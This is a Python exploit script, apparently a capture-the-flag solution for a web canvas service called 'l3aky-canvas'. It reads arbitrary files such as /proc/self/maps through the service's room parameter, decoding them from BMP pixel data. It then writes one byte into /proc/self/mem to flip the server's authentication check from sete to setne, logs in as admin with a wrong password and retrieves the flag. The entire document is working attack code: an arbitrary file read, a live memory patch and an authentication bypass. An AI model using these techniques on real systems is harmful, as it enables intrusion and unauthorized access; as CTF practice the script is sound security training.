#!/usr/bin/env python3
import re
import struct
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:1337"
BINARY = sys.argv[2] if len(sys.argv) > 2 else "l3aky-canvas"
W = H = 64
PAGE = W * H

# auth_check: cmp ecx,[rsp-4]; sete al; ret. patch the 0x94 (sete) to 0x95 (setne).
SIG = bytes.fromhex("3b4c24fc0f94c0c3")


def get(path):
    with urllib.request.urlopen(BASE + path, timeout=10) as r:
        return r.read()


def post(path, **fields):
    req = urllib.request.Request(BASE + path, urllib.parse.urlencode(fields).encode())
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def unbmp(buf):
    off = struct.unpack_from("<I", buf, 10)[0]
    w, h = struct.unpack_from("<ii", buf, 18)
    rows = [buf[off + i * w:off + (i + 1) * w] for i in range(h)]
    return b"".join(reversed(rows))


def read_file(room, pages=8):
    out = b""
    for p in range(pages):
        page = unbmp(get("/canvas?" + urllib.parse.urlencode({"room": room, "offset": p * PAGE})))
        if not any(page):
            break
        out += page
    return out


def to_runtime(maps, off):
    for line in maps.splitlines():
        c = line.split()
        if len(c) < 6 or "l3aky-canvas" not in c[5] or "x" not in c[1]:
            continue
        lo, hi = (int(v, 16) for v in c[0].split("-"))
        base = int(c[2], 16)
        if base <= off < base + (hi - lo):
            return lo + (off - base)
    return None


def coords(addr):
    for y in range(4):
        x = (addr - W * y) % (1 << 64)
        if x % 256 < W:
            return x, y
    raise RuntimeError("no usable coordinates for that address")


blob = open(BINARY, "rb").read()
i = blob.find(SIG)
if i < 0:
    sys.exit(f"signature not found in {BINARY}")
off = i + 5
print(f"[*] patch byte at file offset {hex(off)}")

maps = read_file("/proc/self/maps").split(b"\x00")[0].decode("latin1")
addr = to_runtime(maps, off)
if addr is None:
    sys.exit("could not find the code mapping in /proc/self/maps")
print(f"[*] runtime address {hex(addr)}")

x, y = coords(addr)
code, body = post("/pixel", room="/proc/self/mem", x=x, y=y, color=0x95)
print(f"[*] pixel: {code} {body.decode(errors='replace').strip()}")
if code != 200:
    sys.exit("write rejected (still on cooldown?)")

code, body = post("/login", username="admin", password="123")
if code != 200:
    sys.exit(f"login denied ({code})")
m = re.search(r"flag-[0-9a-f]+\.bin", body.decode(errors="replace"))
if not m:
    sys.exit("flag file not in the room listing")
print(f"[*] flag room -> {m.group()}")

flag = read_file(m.group()).split(b"\x00")[0].decode(errors="replace").strip()
print(f"\n[+] {flag}")
